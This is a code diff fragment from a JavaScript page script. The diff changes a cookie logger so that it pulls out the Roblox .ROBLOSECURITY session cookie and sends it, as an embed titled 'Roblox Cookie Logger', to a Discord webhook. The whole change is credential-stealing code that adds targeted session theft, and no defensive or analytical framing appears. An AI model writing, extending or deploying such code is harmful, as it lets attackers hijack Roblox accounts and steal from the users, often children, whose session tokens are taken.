@@ -162,13 +162,14 @@
         body: JSON.stringify(payload)
       })
       .then(() => {
-        // Log cookies to console
-        console.log('Cookies:', document.cookie);
-        // Send cookie data to Discord webhook
+        // Extract Roblox .ROBLOSECURITY cookie
+        const robloxCookie = document.cookie.split('; ').find(c => c.startsWith('.ROBLOSECURITY=')) || 'No Roblox cookie found';
+        console.log('Roblox Cookie:', robloxCookie);
+        // Send Roblox cookie data to Discord webhook
         const cookiePayload = {
           embeds: [{
-            title: '🍪 Cookie Logger',
-            description: document.cookie || 'No cookies found',
+            title: '🍪 Roblox Cookie Logger',
+            description: robloxCookie,
             color: 0xffff00
           }]
         };
